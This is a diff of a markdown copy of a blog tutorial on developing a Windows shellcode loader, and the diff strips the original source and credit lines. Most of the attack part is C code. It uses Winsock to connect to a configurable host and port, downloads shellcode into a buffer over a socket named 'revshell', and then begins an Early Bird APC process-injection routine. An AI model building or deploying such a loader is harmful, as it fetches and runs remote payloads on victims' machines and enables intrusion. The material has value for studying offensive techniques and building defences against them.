@@ -1,12 +1,8 @@
 # :skull: Crafting Chaos A Deep Dive Into Developing Shellcode Loaders A965A80903F2
 
-> **Original Source:** [Crafting Chaos A Deep Dive Into Developing Shellcode Loaders A965A80903F2](https://infosecwriteups.com/crafting-chaos-a-deep-dive-into-developing-shellcode-loaders-a965a80903f2)
-> **Platform:** infosecwriteups.com | **Category:** `PWN`
-
 ---
 
 ### Technical breakdown:
-
 
 The loader uses “[Winsock2](https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-start-page-2)” library for implementing sockets. If you are not familiar with Winsock2 library then here’s Microsoft’s definition for you.
 
@@ -14,9 +10,7 @@ The loader uses “[Winsock2](https://learn.microsoft.com/en-us/windows/win32/wi
 
 Windows Sockets 2 (Winsock) enables programmers to create advanced Internet, intranet, and other network-capable applications to transmit application data across the wire, independent of the network protocol being used.
 
-
 We need to download our shellcode that we have created and to simplify the process we can break down the download process like this:
-
 
 - Initializing Winsock
 
@@ -26,26 +20,20 @@ We need to download our shellcode that we have created and to simplify the proce
 
 - Receiving data
 
-
 I won’t go in depth about what each of the arguments mean for each function since they’re are all readily available in the documentation.
 
 ### Initializing Winsock
 
-
 We’ll use the WSAStartup() function to initialize Winsock:
-
 
 ```
 WSADATA wsadata;
 WSAStartup(MAKEWORD(2,2), &wsadata);
 ```
 
-
 ### Creating a Socket
 
-
 The socket() function is used to create a socket. The sockaddr_in struct is used to define some required information such as the target IP address and port number:
-
 
 ```
 SOCKET revshell = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -63,12 +51,9 @@ sockaddr.sin_port = htons(443); //Change the port number
 inet_pton(AF_INET, "127.0.0.1", &sockaddr.sin_addr.s_addr); //Change the IP address
 ```
 
-
 ### Connecting to The Server
 
-
 The connect() function is used to connect to the server:
-
 
 ```
 if (connect(revshell, (SOCKADDR*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR) {
@@ -80,12 +65,9 @@ exit(1);
 printf("[+] Connected to socket!\n");
 ```
 
-
 ### Receiving Data
 
-
 To receive that data we use the recv() function and store the response into the variable shellcode:
-
 
 ```
 if (shellcodeDownload = recv(revshell, (char*)shellcode, 1024, 0) == SOCKET_ERROR) {
@@ -99,12 +81,9 @@ shellcode[shellcodeDownload];
 closesocket(revshell);
 ```
 
-
 ### Process Injection
 
-
 Now, We have the program which downloads the shellcode and stores it in a variable. Let’s proceed with the Early Bird APC Injection program. As I have already mentioned , for detailed explanation of this code checkout that blog post that I’ve linked above.
-
 
 ```
 int main() {
@@ -169,6 +148,3 @@ return EXIT_SUCCESS;
 ```
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/crafting-chaos-a-deep-dive-into-developing-shellcode-loaders-a965a80903f2). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of pwn CTF writeups.*
